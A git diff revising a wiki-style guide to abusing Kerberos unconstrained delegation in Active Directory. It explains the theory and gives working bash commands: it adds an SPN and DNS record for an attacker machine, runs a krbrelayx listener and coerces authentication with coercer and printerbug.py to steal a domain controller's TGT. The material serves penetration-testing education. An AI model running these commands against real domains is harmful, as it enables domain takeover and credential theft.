@@ -7,10 +7,10 @@ category: ad
 
 ## Theory
 
-If an account (user or computer), with unconstrained delegations privileges, is compromised, an attacker must wait for a privileged user to authenticate on it (or [force it](../../mitm-and-coerced-authentications/)) using Kerberos. The attacker service will receive an ST (service ticket) containing the user's TGT. That TGT will be used by the service as a proof of identity to obtain access to a target service as the target user. Alternatively, the TGT can be used with [S4U2self abuse](s4u2self-abuse.md) in order to gain local admin privileges over the TGT's owner.
+If an account (user or computer) with unconstrained delegation is compromised, an attacker must wait for a privileged user to authenticate to it via Kerberos (or [force it](../../mitm-and-coerced-authentications/)). When a target authenticates to a KUD-enabled service, the KDC embeds a copy of the target's forwarded TGT inside the Service Ticket (ST) it delivers. The service decrypts the ST with its own Kerberos key, extracts the TGT, and can then use it to request Service Tickets for any other service, effectively impersonating the target. Alternatively, the TGT can be used with [S4U2self abuse](s4u2self-abuse.md) in order to gain local admin privileges over the TGT's owner.
 
 > [!WARNING]
-> If the coerced account is "[is sensitive and cannot be delegated](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/how-to-configure-protected-accounts)" or a member of the "[Protected Users](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group)" group, its TGT will not be delegated in the service ticket used for authentication against the attacker-controlled KUD account.
+> If the coerced account is "[sensitive and cannot be delegated](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/how-to-configure-protected-accounts)" or a member of the "[Protected Users](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group)" group, its TGT will not be delegated in the service ticket used for authentication against the attacker-controlled KUD account.
 
 > [!TIP]
 > **Nota bene**: the native, RID 500, "Administrator" account doesn't benefit from that restriction, even if it's added to the Protected Users group (source: [sensepost.com](https://sensepost.com/blog/2023/protected-users-you-thought-you-were-safe-uh/)).
@@ -26,7 +26,7 @@ If an account (user or computer), with unconstrained delegations privileges, is 
 
 === From the attacker machine (UNIX-like)
 
-In order to abuse the unconstrained delegations privileges of an account, an attacker must add his machine to its SPNs (i.e. of the compromised account) and add a DNS entry for that name.
+In order to abuse the unconstrained delegation of a compromised account, an attacker must register a new SPN on that account pointing to the attacker's machine, and add a matching DNS entry for that hostname.
 
 This allows targets (e.g. Domain Controllers or Exchange servers) to authenticate back to the attacker machine.
 
@@ -35,8 +35,8 @@ All of this can be done from UNIX-like systems with [addspn](https://github.com/
 > [!TIP]
 > When attacking accounts able to delegate without constraints, there are two major scenarios
 > 
-> * the account is a computer: computers can edit their own SPNs via the `msDS-AdditionalDnsHostName` attribute. Since ticket received by krbrelayx will be encrypted with AES256 (by default), attackers will need to either supply the right AES256 key for the unconstrained delegations account (`--aesKey` argument) or the salt and password (`--krbsalt` and `--krbpass` arguments).
-> * the account is a user: users can't edit their own SPNs like computers do. Attackers need to control an [account operator](../../builtins/security-groups) (or any other user that has the needed privileges) to edit the user's SPNs. Moreover, since tickets received by krbrelayx will be encrypted with RC4, attackers will need to either supply the NT hash (`-hashes` argument) or the salt and password (`--krbsalt` and `--krbpass` arguments)
+> * the account is a **computer**: computers can edit their own SPNs via the `msDS-AdditionalDnsHostName` attribute. When the coerced target authenticates to krbrelayx, it sends an AP-REQ containing a Service Ticket (ST) encrypted with the KUD computer account's Kerberos key (AES256 by default). Attackers therefore need to either supply the AES256 key of the unconstrained delegation account (`--aesKey` argument) or its salt and password (`--krbsalt` and `--krbpass` arguments).
+> * the account is a **user**: users can't edit their own SPNs as computers do. Attackers need to control an [account operator](../../builtins/security-groups) (or any account with the required privileges) to modify the user's SPNs. When the coerced target authenticates to krbrelayx, the ST will typically be encrypted with RC4 (using the user account's NT hash as the Kerberos key). Attackers therefore need to supply either the NT hash (`--hashes :NThash` argument) or the salt and password (`--krbsalt` and `--krbpass` arguments).
 
 > [!SUCCESS]
 > By default, the salt is always
@@ -47,33 +47,32 @@ All of this can be done from UNIX-like systems with [addspn](https://github.com/
 
 ```bash
 # 1. Edit the compromised account's SPN via the msDS-AdditionalDnsHostName property (HOST for incoming SMB with PrinterBug, HTTP for incoming HTTP with PrivExchange)
-addspn.py -u 'DOMAIN\CompromisedAccont' -p 'LMhash:NThash' -s 'HOST/attacker.DOMAIN_FQDN' --additional 'DomainController'
+addspn.py -u "$DOMAIN\\$USER" -p "ffffffffffffffffffffffffffffffff:$NT_HASH" --target "TargetKudAccount" --spn 'HOST/attacker.DOMAIN_FQDN' --additional "$DC_HOST"
 
 # 2. Add a DNS entry for the attacker name set in the SPN added in the target machine account's SPNs
-dnstool.py -u 'DOMAIN\CompromisedAccont' -p 'LMhash:NThash' -r 'attacker.DOMAIN_FQDN' -d 'attacker_IP' --action add 'DomainController'
+dnstool.py -u "$DOMAIN\\$USER" -p "ffffffffffffffffffffffffffffffff:$NT_HASH" -r 'attacker.DOMAIN_FQDN' -d 'attacker_IP' --action add "$DC_HOST"
 
 # 3. Check that the record was added successfully (after ~3 minutes)
-nslookup attacker.DOMAIN_FQDN DomainController
+nslookup "attacker.DOMAIN_FQDN" "$DC_HOST"
 
 # 4. Start the krbrelayx listener (the tool needs the right kerberos key to decrypt the ticket it will receive)
 # 4.a. either specify the salt and password. krbrelayx will calculate the kerberos keys
 krbrelayx.py --krbsalt 'DOMAINusername' --krbpass 'password'
 # 4.b. or supply the right Kerberos long-term key directly
-krbrelayx.py -aesKey aes256-cts-hmac-sha1-96-VALUE
+krbrelayx.py --aesKey "$AES_KEY"
 
 # 5. Authentication coercion
-# PrinterBug, PetitPotam, PrivExchange, ...
-printerbug.py domain/'vuln_account$'@'DC_IP' -hashes LM:NT 'DomainController'
+coercer coerce --always-continue -u "$USER" -p "$PASSWORD" -d "$DOMAIN" -t "$TARGET" -l "attacker.DOMAIN_FQDN"
 
-# 6. Check if it works. Krbrelayx should have received and decrypted a ticket, extracting the coerced principal's TGT.
-# There should be a krbtgt ccache file in the current directory. And it can be used by
-export KRB5CCNAME=`pwd`/'krbtgt.ccache'
+# 6. Check if it works. Krbrelayx should have decrypted the received ST and extracted the coerced principal's TGT.
+# A ccache file named after the coerced principal (e.g. DC$.ccache) should appear in the current directory.
+export KRB5CCNAME="/path/to/ccache"
 ```
 
 > [!CAUTION]
 > In case, for some reason, attacking a Domain Controller doesn't work (i.e. error saying`Ciphertext integrity failed.`) try to attack others (if you're certain the credentials you supplied were correct). Some replication and propagation issues could get in the way.
 
-Once the krbrelayx listener is ready, an [authentication coercion attack](../../mitm-and-coerced-authentications/) (e.g. [PrinterBug](../../mitm-and-coerced-authentications/#ms-rprn-abuse-a-k-a-printer-bug), [PrivExchange](../../mitm-and-coerced-authentications/#pushsubscription-abuse-a-k-a-privexchange), [PetitPotam](../../mitm-and-coerced-authentications/rpc-coercions/ms-efsr.md)) can be operated. The listener will then receive a Kerberos authentication, hence a ST, containing a TGT.
+Once the krbrelayx listener is ready, an [authentication coercion attack](../../mitm-and-coerced-authentications/) (e.g. [PrinterBug](../../mitm-and-coerced-authentications/#ms-rprn-abuse-a-k-a-printer-bug), [PrivExchange](../../mitm-and-coerced-authentications/#pushsubscription-abuse-a-k-a-privexchange), [PetitPotam](../../mitm-and-coerced-authentications/rpc-coercions/ms-efsr.md)) can be operated. The listener will then receive a Kerberos authentication, hence an ST, containing an embedded TGT.
 
 The TGT will then be usable with [Pass the Ticket](../pass-the/ptt.md) (to act as the victim) or with [S4U2self abuse](s4u2self-abuse.md) (to obtain local admin privileges over the victim).
 
